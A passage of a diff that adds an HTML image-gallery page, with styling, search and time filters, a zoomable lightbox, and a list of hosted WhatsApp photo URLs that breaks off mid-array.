@@ -1,0 +1,1585 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image X</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        /* Cookie Consent Popup Styles */
+        .cookie-consent {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: rgba(0, 0, 0, 0.85);
+            color: white;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 9999;
+            box-shadow: 0 -5px 20px rgba(0, 0, 0, 0.2);
+            transform: translateY(100%);
+            transition: transform 0.4s ease-in-out;
+        }
+        
+        .cookie-consent.show {
+            transform: translateY(0);
+        }
+        
+        .cookie-text {
+            flex: 1;
+            padding-right: 20px;
+        }
+        
+        .cookie-text h4 {
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+        
+        .cookie-text p {
+            font-size: 14px;
+            line-height: 1.5;
+            opacity: 0.9;
+        }
+        
+        .cookie-buttons {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .cookie-btn {
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        .cookie-btn:hover {
+            transform: translateY(-2px);
+        }
+        
+        .accept-btn {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+        }
+        
+        .customize-btn {
+            background: rgba(255, 255, 255, 0.2);
+            color: white;
+            border: 1px solid rgba(255, 255, 255, 0.4);
+        }
+        
+        /* Cookie Settings Modal */
+        .cookie-settings {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.8);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+        
+        .cookie-settings.show {
+            display: flex;
+        }
+        
+        .settings-content {
+            background: white;
+            border-radius: 10px;
+            width: 90%;
+            max-width: 600px;
+            padding: 30px;
+            color: #333;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+        }
+        
+        .settings-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        
+        .settings-header h3 {
+            font-size: 22px;
+            color: #667eea;
+        }
+        
+        .close-settings {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #999;
+        }
+        
+        .cookie-option {
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #eee;
+        }
+        
+        .cookie-option:last-child {
+            border-bottom: none;
+        }
+        
+        .option-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        
+        .option-header h4 {
+            font-size: 16px;
+        }
+        
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+        }
+        
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+        
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 34px;
+        }
+        
+        .toggle-slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+        
+        input:checked + .toggle-slider {
+            background-color: #667eea;
+        }
+        
+        input:checked + .toggle-slider:before {
+            transform: translateX(26px);
+        }
+        
+        .option-description {
+            font-size: 14px;
+            color: #666;
+            line-height: 1.5;
+        }
+        
+        .settings-footer {
+            display: flex;
+            justify-content: flex-end;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        .save-settings {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            padding: 10px 25px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+        
+        .save-settings:hover {
+            transform: translateY(-2px);
+        }
+        
+        @media (max-width: 768px) {
+            .cookie-consent {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            .cookie-text {
+                padding-right: 0;
+                margin-bottom: 15px;
+            }
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            max-width: 1400px;
+            margin: 0 auto;
+        }
+
+        header {
+            text-align: center;
+            padding: 40px 20px;
+            margin-bottom: 30px;
+        }
+
+        h1 {
+            font-size: 3rem;
+            color: white;
+            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.2);
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: rgba(255, 255, 255, 0.9);
+            font-size: 1.2rem;
+            font-weight: 300;
+        }
+
+        .controls {
+            background: white;
+            border-radius: 20px;
+            padding: 25px;
+            margin-bottom: 30px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.1);
+        }
+
+        .search-container {
+            margin-bottom: 20px;
+        }
+
+        .search-bar {
+            width: 100%;
+            padding: 15px 25px;
+            border: 2px solid #e0e0e0;
+            border-radius: 50px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+            background: #f8f9fa;
+        }
+
+        .search-bar:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
+            box-shadow: 0 0 0 4px rgba(102, 126, 234, 0.1);
+        }
+
+        .filter-controls {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+        }
+
+        .filter-btn {
+            background: #f8f9fa;
+            border: 2px solid transparent;
+            color: #333;
+            padding: 12px 28px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 15px;
+            font-weight: 500;
+            transition: all 0.3s ease;
+        }
+
+        .filter-btn:hover {
+            background: #e9ecef;
+            transform: translateY(-2px);
+        }
+
+        .filter-btn.active {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.4);
+        }
+
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
+            gap: 25px;
+            margin-bottom: 50px;
+        }
+
+        .gallery-item {
+            position: relative;
+            border-radius: 15px;
+            overflow: hidden;
+            background: white;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.1);
+            transition: all 0.4s ease;
+            cursor: pointer;
+            height: 320px;
+        }
+
+        .gallery-item:hover {
+            transform: translateY(-10px) scale(1.02);
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.2);
+        }
+
+        .gallery-item img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transition: transform 0.6s ease;
+        }
+
+        .gallery-item:hover img {
+            transform: scale(1.1);
+        }
+
+        .no-results {
+            grid-column: 1 / -1;
+            text-align: center;
+            padding: 80px 20px;
+            color: white;
+            font-size: 1.5rem;
+            font-weight: 300;
+        }
+
+        .lightbox {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.95);
+            z-index: 1000;
+            overflow: auto;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .lightbox.active {
+            display: flex;
+        }
+
+        .lightbox img {
+            max-width: 90%;
+            max-height: 90vh;
+            display: block;
+            border-radius: 10px;
+            box-shadow: 0 0 50px rgba(255, 255, 255, 0.1);
+            cursor: move;
+            transition: transform 0.3s ease;
+        }
+        
+        .lightbox-title {
+            position: absolute;
+            top: 15px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            color: white;
+            background-color: rgba(0, 0, 0, 0.5);
+            padding: 5px 10px;
+            margin: 0 auto;
+            max-width: 80%;
+            border-radius: 5px;
+            font-size: 16px;
+            z-index: 1001;
+        }
+
+        .close-lightbox {
+            position: fixed;
+            top: 30px;
+            right: 40px;
+            color: white;
+            font-size: 40px;
+            cursor: pointer;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            transition: all 0.3s ease;
+            z-index: 1001;
+        }
+
+        .close-lightbox:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: rotate(90deg);
+        }
+
+        .zoom-controls {
+            position: fixed;
+            top: 30px;
+            left: 40px;
+            display: flex;
+            gap: 10px;
+            z-index: 1001;
+            align-items: center;
+        }
+
+        .zoom-controls button {
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 20px;
+            font-weight: bold;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .zoom-controls button:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: scale(1.1);
+        }
+
+        .zoom-level {
+            background: rgba(0, 0, 0, 0.6);
+            padding: 10px 20px;
+            border-radius: 25px;
+            color: white;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .lightbox-nav {
+            position: fixed;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(255, 255, 255, 0.1);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 24px;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1001;
+        }
+
+        .lightbox-nav:hover {
+            background: rgba(255, 255, 255, 0.2);
+            transform: translateY(-50%) scale(1.1);
+        }
+
+        .lightbox-nav.prev {
+            left: 40px;
+        }
+
+        .lightbox-nav.next {
+            right: 40px;
+        }
+
+        .download-btn {
+            position: fixed;
+            bottom: 40px;
+            right: 40px;
+            background: rgba(102, 126, 234, 0.9);
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            color: white;
+            padding: 15px 30px;
+            border-radius: 50px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 1001;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .download-btn:hover {
+            background: rgba(102, 126, 234, 1);
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(102, 126, 234, 0.5);
+        }
+
+        .info-box {
+            background: rgba(255, 255, 255, 0.95);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .info-box h3 {
+            color: #667eea;
+            margin-bottom: 10px;
+        }
+
+        .info-box p {
+            color: #666;
+            line-height: 1.6;
+        }
+
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2rem;
+            }
+
+            .gallery {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+                gap: 15px;
+            }
+
+            .gallery-item {
+                height: 200px;
+                width: calc(50% - 20px);
+            }
+
+            .filter-btn {
+                padding: 10px 20px;
+                font-size: 14px;
+            }
+
+            .zoom-controls,
+            .close-lightbox {
+                top: 15px;
+                left: 15px;
+            }
+
+            .close-lightbox {
+                right: 15px;
+            }
+
+            .lightbox-nav {
+                width: 50px;
+                height: 50px;
+                font-size: 20px;
+            }
+
+            .lightbox-nav.prev {
+                left: 15px;
+            }
+
+            .lightbox-nav.next {
+                right: 15px;
+            }
+            
+            .controls {
+                flex-direction: column;
+            }
+            
+            .search-container {
+                width: 100%;
+                margin-bottom: 10px;
+            }
+            
+            .filter-buttons {
+                width: 100%;
+                justify-content: center;
+            }
+            
+            .cookie-consent {
+                flex-direction: column;
+            }
+            
+            .cookie-buttons {
+                margin-top: 15px;
+                width: 100%;
+                justify-content: space-between;
+            }
+            
+            .settings-content {
+                width: 95%;
+                max-height: 90vh;
+                overflow-y: auto;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .gallery-item {
+                width: 100%;
+            }
+            
+            .cookie-btn {
+                width: 48%;
+            }
+        }
+
+        /* Cookie Consent Styles */
+        .cookie-consent {
+            position: fixed;
+            bottom: -100px;
+            left: 0;
+            right: 0;
+            background-color: rgba(51, 51, 51, 0.95);
+            color: #fff;
+            padding: 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            z-index: 9999;
+            box-shadow: 0 -2px 10px rgba(0, 0, 0, 0.2);
+            transition: bottom 0.5s ease-in-out;
+        }
+
+        .cookie-consent.show {
+            bottom: 0;
+        }
+
+        .cookie-text {
+            flex: 1;
+        }
+
+        .cookie-text h4 {
+            margin-top: 0;
+            margin-bottom: 10px;
+            font-size: 18px;
+        }
+
+        .cookie-text p {
+            margin: 0;
+            font-size: 14px;
+            line-height: 1.5;
+        }
+
+        .cookie-buttons {
+            display: flex;
+            gap: 10px;
+        }
+
+        .cookie-btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .customize-btn {
+            background-color: transparent;
+            color: #fff;
+            border: 1px solid #fff;
+        }
+
+        .customize-btn:hover {
+            background-color: rgba(255, 255, 255, 0.1);
+        }
+
+        .accept-btn {
+            background-color: #4CAF50;
+            color: white;
+        }
+
+        .accept-btn:hover {
+            background-color: #45a049;
+        }
+
+        /* Cookie Settings Modal */
+        .cookie-settings {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: rgba(0, 0, 0, 0.7);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.3s, visibility 0.3s;
+        }
+
+        .cookie-settings.show {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .settings-content {
+            background-color: #fff;
+            border-radius: 8px;
+            width: 600px;
+            max-width: 90%;
+            color: #333;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+
+        .settings-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .settings-header h3 {
+            margin: 0;
+            font-size: 20px;
+        }
+
+        .close-settings {
+            background: none;
+            border: none;
+            font-size: 24px;
+            cursor: pointer;
+            color: #777;
+        }
+
+        .cookie-option {
+            padding: 15px 20px;
+            border-bottom: 1px solid #eee;
+        }
+
+        .option-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 8px;
+        }
+
+        .option-header h4 {
+            margin: 0;
+            font-size: 16px;
+        }
+
+        .option-description {
+            margin: 0;
+            font-size: 14px;
+            color: #666;
+        }
+
+        .settings-footer {
+            padding: 15px 20px;
+            text-align: right;
+        }
+
+        .save-settings {
+            padding: 8px 16px;
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+
+        .save-settings:hover {
+            background-color: #45a049;
+        }
+
+        /* Toggle Switch */
+        .toggle-switch {
+            position: relative;
+            display: inline-block;
+            width: 50px;
+            height: 24px;
+        }
+
+        .toggle-switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .toggle-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background-color: #ccc;
+            transition: .4s;
+            border-radius: 24px;
+        }
+
+        .toggle-slider:before {
+            position: absolute;
+            content: "";
+            height: 16px;
+            width: 16px;
+            left: 4px;
+            bottom: 4px;
+            background-color: white;
+            transition: .4s;
+            border-radius: 50%;
+        }
+
+        input:checked + .toggle-slider {
+            background-color: #4CAF50;
+        }
+
+        input:disabled + .toggle-slider {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+
+        input:checked + .toggle-slider:before {
+            transform: translateX(26px);
+        }
+     </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1>Printx</h1>
+            <p class="subtitle">Browse your beautiful collection</p>
+        </header>
+
+
+
+        <div class="controls">
+            <div class="search-container">
+                <input type="text" id="search-bar" class="search-bar" placeholder="🔍 Search images...">
+            </div>
+
+            <div class="filter-controls">
+                <button class="filter-btn active" data-period="all">All Images</button>
+                <button class="filter-btn" data-period="335">3:35 PM</button>
+                <button class="filter-btn" data-period="336">3:36 PM</button>
+                <button class="filter-btn" data-period="348">3:48 PM</button>
+            </div>
+        </div>
+
+        <div class="gallery" id="gallery"></div>
+    </div>
+
+    <div class="lightbox" id="lightbox">
+        <span class="close-lightbox" id="close-lightbox">&times;</span>
+        <div class="zoom-controls">
+            <button id="zoom-in">+</button>
+            <button id="zoom-out">−</button>
+            <button id="zoom-reset" style="width: auto; padding: 0 20px; border-radius: 25px;">Reset</button>
+            <span id="zoom-level" class="zoom-level">100%</span>
+        </div>
+        <h3 id="lightbox-title" class="lightbox-title"></h3>
+        <button class="lightbox-nav prev" id="prev-btn">‹</button>
+        <button class="lightbox-nav next" id="next-btn">›</button>
+        <button class="download-btn" id="download-btn">📥 Download</button>
+        <img id="lightbox-img" src="" alt="Enlarged image">
+    </div>
+
+    <script>
+        // Complete list of all WhatsApp images with Postimages URLs
+        const images = [
+            "https://i.postimg.cc/2y6SRSJr/Whats-App-Image-2025-10-02-at-3-35-53-PM.jpg",
+            "https://i.postimg.cc/0QZyBwts/Whats-App-Image-2025-10-02-at-3-35-53-PM-1.jpg",
+            "https://i.postimg.cc/x8C1D17N/Whats-App-Image-2025-10-02-at-3-35-54-PM.jpg",
+            "https://i.postimg.cc/tJT4Q4fC/Whats-App-Image-2025-10-02-at-3-35-54-PM-1.jpg",
+            "https://i.postimg.cc/90MQ5QSz/Whats-App-Image-2025-10-02-at-3-35-54-PM-2.jpg",
+            "https://i.postimg.cc/tJMCXHQF/Whats-App-Image-2025-10-02-at-3-35-55-PM.jpg",
+            "https://i.postimg.cc/ZnR5t5gq/Whats-App-Image-2025-10-02-at-3-35-55-PM-1.jpg",
+            "https://i.postimg.cc/gjJ2F25v/Whats-App-Image-2025-10-02-at-3-35-55-PM-2.jpg",
+            "https://i.postimg.cc/qq5MkdVm/Whats-App-Image-2025-10-02-at-3-35-56-PM.jpg",
+            "https://i.postimg.cc/zvcXJ1Zy/Whats-App-Image-2025-10-02-at-3-35-56-PM-1.jpg",
+            "https://i.postimg.cc/d3xtqKPH/Whats-App-Image-2025-10-02-at-3-35-56-PM-2.jpg",
+            "https://i.postimg.cc/9X8fPyRZ/Whats-App-Image-2025-10-02-at-3-35-57-PM.jpg",
+            "https://i.postimg.cc/qq5MkdVS/Whats-App-Image-2025-10-02-at-3-35-57-PM-1.jpg",
+            "https://i.postimg.cc/kGpXnd3p/Whats-App-Image-2025-10-02-at-3-35-57-PM-2.jpg",
+            "https://i.postimg.cc/y6QNh0g0/Whats-App-Image-2025-10-02-at-3-35-58-PM.jpg",
+            "https://i.postimg.cc/kM15NW68/Whats-App-Image-2025-10-02-at-3-35-58-PM-1.jpg",
+            "https://i.postimg.cc/HWZL0bc4/Whats-App-Image-2025-10-02-at-3-35-58-PM-2.jpg",
+            "https://i.postimg.cc/TYBYFGJF/Whats-App-Image-2025-10-02-at-3-35-59-PM.jpg",
+            "https://i.postimg.cc/TYK3thgJ/Whats-App-Image-2025-10-02-at-3-35-59-PM-1.jpg",
+            "https://i.postimg.cc/c4vLF6wc/Whats-App-Image-2025-10-02-at-3-35-59-PM-2.jpg",
+            "https://i.postimg.cc/qMWMS0G0/Whats-App-Image-2025-10-02-at-3-36-00-PM.jpg",
+            "https://i.postimg.cc/7YjYdDnc/Whats-App-Image-2025-10-02-at-3-36-00-PM-1.jpg",
+            "https://i.postimg.cc/tC8CwyN8/Whats-App-Image-2025-10-02-at-3-36-00-PM-2.jpg",
+            "https://i.postimg.cc/L8f6M7yt/Whats-App-Image-2025-10-02-at-3-36-01-PM.jpg",
+            "https://i.postimg.cc/NjTfwVNG/Whats-App-Image-2025-10-02-at-3-36-01-PM-1.jpg",
+            "https://i.postimg.cc/0ym2q3tS/Whats-App-Image-2025-10-02-at-3-36-01-PM-2.jpg",
+            "https://i.postimg.cc/Bv0ZZgyV/Whats-App-Image-2025-10-02-at-3-36-02-PM.jpg",
+            "https://i.postimg.cc/1365ZTWr/Whats-App-Image-2025-10-02-at-3-36-02-PM-1.jpg",
+            "https://i.postimg.cc/Pqjff4cM/Whats-App-Image-2025-10-02-at-3-36-02-PM-2.jpg",
+            "https://i.postimg.cc/8Cmp7vgP/Whats-App-Image-2025-10-02-at-3-36-03-PM.jpg",
+            "https://i.postimg.cc/rpkyyJbn/Whats-App-Image-2025-10-02-at-3-36-03-PM-1.jpg",
+            "https://i.postimg.cc/6QX660gw/Whats-App-Image-2025-10-02-at-3-36-03-PM-2.jpg",
+            "https://i.postimg.cc/cHDdmNJT/Whats-App-Image-2025-10-02-at-3-36-04-PM.jpg",
+            "https://i.postimg.cc/tgNqs6G3/Whats-App-Image-2025-10-02-at-3-36-04-PM-1.jpg",
+            "https://i.postimg.cc/NMGgm0QK/Whats-App-Image-2025-10-02-at-3-36-04-PM-2.jpg",
+            "https://i.postimg.cc/1zsP1zVh/Whats-App-Image-2025-10-02-at-3-36-05-PM.jpg",
+            "https://i.postimg.cc/gcTYLdQx/Whats-App-Image-2025-10-02-at-3-36-05-PM-1.jpg",
+            "https://i.postimg.cc/R049x06b/Whats-App-Image-2025-10-02-at-3-36-05-PM-2.jpg",
+            "https://i.postimg.cc/V6N85HRw/Whats-App-Image-2025-10-02-at-3-36-06-PM.jpg",
+            "https://i.postimg.cc/zf7Nz1Tn/Whats-App-Image-2025-10-02-at-3-36-06-PM-1.jpg",
+            "https://i.postimg.cc/0jM10MFj/Whats-App-Image-2025-10-02-at-3-36-07-PM.jpg",
+            "https://i.postimg.cc/Qtnr7k4X/Whats-App-Image-2025-10-02-at-3-36-07-PM-1.jpg",
+            "https://i.postimg.cc/sX0RW96G/Whats-App-Image-2025-10-02-at-3-36-07-PM-2.jpg",
+            "https://i.postimg.cc/4y7RQ7q9/Whats-App-Image-2025-10-02-at-3-36-08-PM.jpg",
+            "https://i.postimg.cc/Gt8nx8V8/Whats-App-Image-2025-10-02-at-3-36-08-PM-1.jpg",
+            "https://i.postimg.cc/hvzR1z6X/Whats-App-Image-2025-10-02-at-3-36-08-PM-2.jpg",
+            "https://i.postimg.cc/3N4QF4VC/Whats-App-Image-2025-10-02-at-3-36-09-PM.jpg",
+            "https://i.postimg.cc/gjXbHXQ3/Whats-App-Image-2025-10-02-at-3-36-09-PM-2.jpg",
+            "https://i.postimg.cc/SRBFTQb6/Whats-App-Image-2025-10-02-at-3-36-10-PM.jpg",
+            "https://i.postimg.cc/MHMJmMN5/Whats-App-Image-2025-10-02-at-3-36-10-PM-1.jpg",
+            "https://i.postimg.cc/VvrPWrpZ/Whats-App-Image-2025-10-02-at-3-36-10-PM-2.jpg",
+            "https://i.postimg.cc/ry3kFjRt/Whats-App-Image-2025-10-02-at-3-36-11-PM.jpg",
+            "https://i.postimg.cc/hvkWy4Ry/Whats-App-Image-2025-10-02-at-3-36-11-PM-1.jpg",
+            "https://i.postimg.cc/1R2Q5BVV/Whats-App-Image-2025-10-02-at-3-36-12-PM.jpg",
+            "https://i.postimg.cc/xjh2T5NJ/Whats-App-Image-2025-10-02-at-3-36-12-PM-1.jpg",
+            "https://i.postimg.cc/7PdkY9J5/Whats-App-Image-2025-10-02-at-3-36-12-PM-2.jpg",
+            "https://i.postimg.cc/FF84spkb/Whats-App-Image-2025-10-02-at-3-36-13-PM.jpg",
+            "https://i.postimg.cc/Pf9jryvm/Whats-App-Image-2025-10-02-at-3-36-13-PM-1.jpg",
+            "https://i.postimg.cc/G3VChKTx/Whats-App-Image-2025-10-02-at-3-36-14-PM.jpg",
+            "https://i.postimg.cc/T2F6Y050/Whats-App-Image-2025-10-02-at-3-36-14-PM-1.jpg",
+            "https://i.postimg.cc/m29Gc97v/Whats-App-Image-2025-10-02-at-3-36-15-PM.jpg",
+            "https://i.postimg.cc/CMXgL7fy/Whats-App-Image-2025-10-02-at-3-36-15-PM-1.jpg",
+            "https://i.postimg.cc/9F9j49GQ/Whats-App-Image-2025-10-02-at-3-36-16-PM.jpg",
+            "https://i.postimg.cc/sDWRBWpF/Whats-App-Image-2025-10-02-at-3-36-16-PM-1.jpg",
+            "https://i.postimg.cc/5NzMHzwW/Whats-App-Image-2025-10-02-at-3-36-16-PM-2.jpg",
+            "https://i.postimg.cc/NjwvR04B/Whats-App-Image-2025-10-02-at-3-36-17-PM.jpg",
+            "https://i.postimg.cc/bwjf1vTJ/Whats-App-Image-2025-10-02-at-3-36-17-PM-1.jpg",
+            "https://i.postimg.cc/dVKcG0BJ/Whats-App-Image-2025-10-02-at-3-36-17-PM-2.jpg",
+            "https://i.postimg.cc/8zBQ4VKh/Whats-App-Image-2025-10-02-at-3-36-18-PM.jpg",
+            "https://i.postimg.cc/QdrZcMbS/Whats-App-Image-2025-10-02-at-3-36-18-PM-1.jpg",
+            "https://i.postimg.cc/1zmxYYb9/Whats-App-Image-2025-10-02-at-3-36-19-PM.jpg",
+            "https://i.postimg.cc/cLMyhN93/Whats-App-Image-2025-10-02-at-3-36-19-PM-1.jpg",
+            "https://i.postimg.cc/L8MFjsTD/Whats-App-Image-2025-10-02-at-3-36-19-PM-2.jpg",
+            "https://i.postimg.cc/s2TFF4RH/Whats-App-Image-2025-10-02-at-3-36-20-PM.jpg",
+            "https://i.postimg.cc/MG9kkm8D/Whats-App-Image-2025-10-02-at-3-36-20-PM-1.jpg",
+            "https://i.postimg.cc/LXWr545s/Whats-App-Image-2025-10-02-at-3-36-21-PM.jpg",
+            "https://i.postimg.cc/xd6rr3SG/Whats-App-Image-2025-10-02-at-3-36-21-PM-1.jpg",
+            "https://i.postimg.cc/Jn0fRH1p/Whats-App-Image-2025-10-02-at-3-36-21-PM-2.jpg",
+            "https://i.postimg.cc/j51G2q2N/Whats-App-Image-2025-10-02-at-3-36-22-PM.jpg",
+            "https://i.postimg.cc/TwsZ121b/Whats-App-Image-2025-10-02-at-3-36-22-PM-1.jpg",
+            "https://i.postimg.cc/MTLhHZHV/Whats-App-Image-2025-10-02-at-3-36-23-PM-1.jpg",
+            "https://i.postimg.cc/br24tXSD/Whats-App-Image-2025-10-02-at-3-36-23-PM-2.jpg",
+            "https://i.postimg.cc/7b8d1Bgv/Whats-App-Image-2025-10-02-at-3-36-24-PM.jpg",
+            "https://i.postimg.cc/mhfJ3d75/Whats-App-Image-2025-10-02-at-3-36-24-PM-1.jpg",
+            "https://i.postimg.cc/SQ2KrJ60/Whats-App-Image-2025-10-02-at-3-36-25-PM.jpg",
+            "https://i.postimg.cc/t7QwdrhR/Whats-App-Image-2025-10-02-at-3-36-25-PM-1.jpg",
+            "https://i.postimg.cc/ZK6KG2s3/Whats-App-Image-2025-10-02-at-3-36-26-PM.jpg",
+            "https://i.postimg.cc/xTLTwhpq/Whats-App-Image-2025-10-02-at-3-36-26-PM-2.jpg",
+            "https://i.postimg.cc/RZRCFfBq/Whats-App-Image-2025-10-02-at-3-36-27-PM.jpg",
+            "https://i.postimg.cc/BZrnw4pn/Whats-App-Image-2025-10-02-at-3-36-27-PM-1.jpg",
+            "https://i.postimg.cc/BngZ6D0f/Whats-App-Image-2025-10-02-at-3-36-27-PM-2.jpg",
+            "https://i.postimg.cc/XvYjyJjm/Whats-App-Image-2025-10-02-at-3-36-28-PM.jpg",
+            "https://i.postimg.cc/cLm1HYSC/Whats-App-Image-2025-10-02-at-3-36-28-PM-1.jpg",
+            "https://i.postimg.cc/4x54dtgt/Whats-App-Image-2025-10-02-at-3-36-28-PM-2.jpg",
+            "https://i.postimg.cc/jj3s6bCt/Whats-App-Image-2025-10-02-at-3-36-29-PM.jpg",
+            "https://i.postimg.cc/s2gjZXjJ/Whats-App-Image-2025-10-02-at-3-36-29-PM-1.jpg",
+            "https://i.postimg.cc/k4V7fptJ/Whats-App-Image-2025-10-02-at-3-36-30-PM.jpg",
+            "https://i.postimg.cc/QtBj0yWN/Whats-App-Image-2025-10-02-at-3-36-30-PM-1.jpg",
+            "https://i.postimg.cc/KzKmJHgn/Whats-App-Image-2025-10-02-at-3-36-30-PM-2.jpg",
+            "https://i.postimg.cc/3RPY6Fgp/Whats-App-Image-2025-10-02-at-3-36-31-PM.jpg",
+            "https://i.postimg.cc/1tgyJjN0/Whats-App-Image-2025-10-02-at-3-36-31-PM-1.jpg",
+            "https://i.postimg.cc/50ZbGSwC/Whats-App-Image-2025-10-02-at-3-36-31-PM-2.jpg",
+            "https://i.postimg.cc/sXts84p6/Whats-App-Image-2025-10-02-at-3-36-32-PM.jpg",
+            "https://i.postimg.cc/9MvCSYGt/Whats-App-Image-2025-10-02-at-3-36-32-PM-1.jpg",
+            "https://i.postimg.cc/cHV0jBQX/Whats-App-Image-2025-10-02-at-3-36-32-PM-2.jpg",
+            "https://i.postimg.cc/Znp4hvcs/Whats-App-Image-2025-10-02-at-3-36-33-PM.jpg",
+            "https://i.postimg.cc/przRt5Z1/Whats-App-Image-2025-10-02-at-3-36-33-PM-2.jpg",
+            "https://i.postimg.cc/KjBxy3f4/Whats-App-Image-2025-10-02-at-3-36-34-PM.jpg",
+            "https://i.postimg.cc/KjBxy3N6/Whats-App-Image-2025-10-02-at-3-36-34-PM-1.jpg",
+            "https://i.postimg.cc/HnXdC82K/Whats-App-Image-2025-10-02-at-3-36-34-PM-2.jpg",
